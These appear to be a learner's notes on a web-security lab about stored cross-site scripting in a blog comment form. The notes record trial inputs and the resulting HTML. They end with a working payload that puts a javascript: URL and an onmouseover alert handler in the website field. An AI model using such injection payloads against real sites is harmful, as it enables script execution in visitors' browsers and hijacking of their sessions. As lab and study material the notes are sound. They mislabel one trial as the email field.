# Stored XSS into anchor href attribute with double quotes HTML-encoded

  

**Notes:**

**Analysis**

  

There are 4 fileds in comment section

Comment, name, email, website

  

***Trial 1***

  

1. Comment : hello from hecker

  

2. Name : hecker

  

3. Email : hecker@web.com

  

4. Website : hecker.com

  

**Observation** : *Testing*

  

    <section class="comment">
    
    <p>
    
    <img src="/resources/images/avatarDefault.svg" class="avatar">
    
    <a id="author" href="hecker.com">hecker</a> | 11 January 2022
    
    </p>
    
    <p>hello from hecker</p>
    
    <p></p>
    
    </section>

  

***Trial 2 : Injecting JS to Comment field***

  

1. Comment : <script>alert('hello from hecker')</script>

  

2. Name : hecker2

  

3. Email : hecker@web.com

  

4. Website : hecker.com

  

**Observation : *Failure***

Angle brackets are HTML encoded

  

    <section class="comment">
    
    <p>
    
    <img src="/resources/images/avatarDefault.svg" class="avatar">
    
    <a id="author" href="hecker.com">hecker2</a> | 11 January 2022
    
    </p>
    
    <p>&lt;script&gt;alert(&apos;hello from hecker&apos;)&lt;/script&gt;</p>
    
    <p></p>
    
    </section>

  
  

***Trial 2 : Injecting JS to email field as it contains href tag***

  

1. Comment : hello from hecker3

  

2. Name : hecker3

  

3. Email : hecker@web.com

  

4. Website : "javascript:void(0)" onmouseover="alert('hello from hecker3')"

  

<a  id="author"  href="javascript:void(0)"  onmouseover="alert('hello from hecker3')">hecker2</a>

  

From the above trial and reviewing the source code, we can link JS to href attribute.

If we can able to inject event handlers inside the href attribute, then we can say, its vulnerable to XSS

  
  

**Observation : Success**

  

    <section class="comment">
    
    <p>
    
    <img src="/resources/images/avatarDefault.svg" class="avatar">
    
    <a id="author" href="javascript:void(0)" onmouseover="alert(&apos;hello from hecker3&apos;)"">hecker3</a> | 11 January 2022
    
    </p>
    
    <p>hello from hecker3</p>
    
    <p></p>
    
    </section>
